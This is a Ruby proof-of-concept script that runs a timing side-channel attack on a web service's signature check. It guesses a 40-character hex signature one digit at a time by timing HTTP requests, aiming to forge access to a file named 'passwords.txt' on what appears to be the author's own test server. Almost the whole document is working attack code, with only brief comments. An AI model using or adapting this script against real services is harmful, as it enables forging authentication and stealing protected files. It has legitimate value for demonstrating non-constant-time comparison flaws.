#!/usr/bin/env ruby
#technion@lolware.net
#Interesting fact: even with the artificial delay turned up to 500ms,
#WEBrick performance was too inconsistent for this to work.
#Server must run Unicorn or similar.

require 'net/http'

uri = URI('http://lolware.net:3000')

#Test, working URI:
#http://lolware.net:3000/?filename=passwords.txt&signature=584d58d79bbd58242a343aa5bf3d7a3dcf8a5a1a

key = 'A' * 40 #initial string of correct size
#First query - throwaway key. Ramps up service.
params = { :filename => 'passwords.txt', :signature => key }
uri.query = URI.encode_www_form(params)
res = Net::HTTP.get_response(uri)

(0..key.length-1).each { |n|
    delta = 0  
    winning = 0 #Unused value to delcare outside loop
    (0..15).each { |a|
        key[n] = a.to_s(16)
        puts key
        params = { :filename => 'passwords.txt', :signature => key }
        uri.query = URI.encode_www_form(params)
        t = Time.now
        res = Net::HTTP.get_response(uri)
        if Time.now - t > delta
            delta = Time.now - t
            winning = a
        end
        #puts "Query took #{Time.now - t} seconds"
        #puts res.body if res.is_a?(Net::HTTPSuccess)
    }
    puts "Winning value is #{winning}"
    key[n] = winning.to_s(16)
}

puts "VALID KEY IS: #{key} "

